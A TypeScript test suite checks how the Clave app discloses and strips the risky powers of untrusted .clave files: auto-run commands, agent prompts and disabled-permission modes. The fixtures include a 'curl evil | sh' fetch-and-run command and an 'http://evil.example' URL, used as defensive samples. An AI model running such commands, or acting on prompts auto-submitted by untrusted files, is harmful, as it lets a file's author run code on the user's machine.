/**
 * The `.clave` TRUST BOUNDARY.
 *
 * A `.clave` file can act the moment it is opened: run commands without asking,
 * launch agents with permissions disabled, and auto-submit a prompt that sets an
 * agent working. For a file the user has NOT trusted, Clave shows a review
 * dialog listing exactly what would run, and "Open safely" strips those powers.
 *
 * Two functions carry that boundary — `describeElevated` decides what the dialog
 * discloses, `sanitizeElevated` decides what survives "Open safely" — and both
 * enumerate fields by hand, so every new `.clave` field that can drive an agent
 * has to be added to both or it silently bypasses the gate.
 *
 * These tests exist because that failure is invisible: an untrusted file whose
 * prompt is neither disclosed nor stripped looks exactly like one that is.
 * Do not delete them as redundant with the UI checks — the UI cannot see this.
 */

import { describe, expect, it } from 'vitest'
import {
  describeElevated,
  sanitizeElevated,
  type ClaveFileReadResult,
  type ClaveGroupData
} from './clave-trust'

function group(overrides: Partial<ClaveGroupData> = {}): ClaveGroupData {
  return {
    name: 'Group',
    cwd: '/tmp/x',
    color: null,
    sessions: [],
    terminals: [],
    ...overrides
  }
}

const session = (overrides = {}): ClaveGroupData['sessions'][number] => ({
  cwd: '/tmp/x',
  name: 'tab',
  claudeMode: true,
  antigravityMode: false,
  codexMode: false,
  piMode: false,
  claudeAgentsMode: false,
  dangerousMode: false,
  ...overrides
})

const single = (g: ClaveGroupData): ClaveFileReadResult => ({ type: 'single', ...g })

describe('describeElevated — what the review dialog must disclose', () => {
  it('discloses a GROUP-level prompt', () => {
    const result = single(group({ prompt: 'rm the thing and report back' }))
    expect(describeElevated(result).prompts).toContain('rm the thing and report back')
  })

  it('discloses a session-level prompt', () => {
    const result = single(group({ sessions: [session({ prompt: 'do the thing' })] }))
    expect(describeElevated(result).prompts).toContain('do the thing')
  })

  it('treats a Pi launch prompt as elevated and strips it in safe mode', () => {
    const loaded = single(
      group({ sessions: [session({ claudeMode: false, piMode: true, prompt: 'work now' })] })
    )
    expect(describeElevated(loaded).prompts).toEqual(['work now'])
    const safe = sanitizeElevated(loaded) as ClaveFileReadResult & ClaveGroupData
    expect(safe.sessions[0].piMode).toBe(true)
    expect(safe.sessions[0].prompt).toBeUndefined()
  })

  it('discloses auto-run commands and dangerousMode', () => {
    const result = single(
      group({
        sessions: [session({ dangerousMode: true })],
        terminals: [{ command: 'curl evil | sh', commandMode: 'auto', color: 'red' }]
      })
    )
    const described = describeElevated(result)
    expect(described.autoCommands).toContain('curl evil | sh')
    expect(described.dangerous).toBe(true)
  })

  it('reaches every group of a multi-group file', () => {
    const result: ClaveFileReadResult = {
      type: 'multi',
      groups: [group({ prompt: 'first' }), group({ prompt: 'second' })]
    }
    expect(describeElevated(result).prompts).toEqual(['first', 'second'])
  })

  it('says nothing is elevated when nothing is', () => {
    const described = describeElevated(single(group({ sessions: [session()] })))
    expect(described).toEqual({ autoCommands: [], prompts: [], dangerous: false })
  })
})

describe('sanitizeElevated — what "Open safely" must strip', () => {
  it('strips a GROUP-level prompt', () => {
    const out = sanitizeElevated(single(group({ prompt: 'drive the agent' })))
    expect(out.type).toBe('single')
    expect((out as { prompt?: string }).prompt).toBeUndefined()
  })

  it('strips session prompts and disables dangerousMode', () => {
    const out = sanitizeElevated(
      single(group({ sessions: [session({ prompt: 'go', dangerousMode: true })] }))
    )
    const s = (out as ClaveFileReadResult & ClaveGroupData).sessions[0]
    expect(s.prompt).toBeUndefined()
    expect(s.dangerousMode).toBe(false)
  })

  it('downgrades auto-run commands to prefill rather than dropping them', () => {
    const out = sanitizeElevated(
      single(group({ terminals: [{ command: 'npm run dev', commandMode: 'auto', color: 'blue' }] }))
    )
    const terminals = (out as ClaveFileReadResult & ClaveGroupData).terminals
    expect(terminals[0].commandMode).toBe('prefill')
    expect(terminals[0].command).toBe('npm run dev')
  })

  it('sanitizes every group of a multi-group file', () => {
    const out = sanitizeElevated({
      type: 'multi',
      groups: [group({ prompt: 'first' }), group({ prompt: 'second' })]
    })
    if (out.type !== 'multi') throw new Error('expected multi')
    expect(out.groups.map((g) => g.prompt)).toEqual([undefined, undefined])
  })

  it('drops groupView — an untrusted file must not render a page inside Clave', () => {
    const out = sanitizeElevated(
      single(
        group({
          terminals: [
            {
              command: 'npm run dev',
              commandMode: 'prefill',
              color: 'green',
              serverUrl: 'http://evil.example',
              groupView: true
            }
          ]
        })
      )
    )
    const terminals = (out as ClaveFileReadResult & ClaveGroupData).terminals
    expect(terminals[0].groupView).toBeUndefined()
    // The terminal itself is harmless and survives, serverUrl included.
    expect(terminals[0].command).toBe('npm run dev')
    expect(terminals[0].serverUrl).toBe('http://evil.example')
  })

  it("drops the group's own view for the same reason", () => {
    const out = sanitizeElevated(single(group({ view: '/tmp/anything.html' })))
    expect((out as ClaveFileReadResult & ClaveGroupData).view).toBeUndefined()
  })

  it('leaves the harmless parts of the file intact', () => {
    const out = sanitizeElevated(single(group({ name: 'Docs', cwd: '/tmp/docs', prompt: 'x' })))
    const g = out as ClaveFileReadResult & ClaveGroupData
    expect(g.name).toBe('Docs')
    expect(g.cwd).toBe('/tmp/docs')
  })

  it("keeps a session's account: it routes the session, it drives nothing (ADR 0002)", () => {
    const out = sanitizeElevated(
      single(group({ sessions: [session({ account: 'Work', prompt: 'brief' })] }))
    )
    const g = out as ClaveFileReadResult & ClaveGroupData
    expect(g.sessions[0].account).toBe('Work')
    expect(g.sessions[0].prompt).toBeUndefined()
    expect(describeElevated(out)).toEqual({ autoCommands: [], prompts: [], dangerous: false })
  })
})

describe('the two must agree', () => {
  it('anything disclosed as elevated is gone after sanitizing', () => {
    const loaded = single(
      group({
        prompt: 'group brief',
        sessions: [session({ prompt: 'session brief', dangerousMode: true })],
        terminals: [{ command: 'do-it', commandMode: 'auto', color: 'red' }]
      })
    )
    expect(describeElevated(loaded).prompts.length).toBeGreaterThan(0)
    const safe = sanitizeElevated(loaded)
    const after = describeElevated(safe)
    expect(after.prompts).toEqual([])
    expect(after.autoCommands).toEqual([])
    expect(after.dangerous).toBe(false)
  })
})
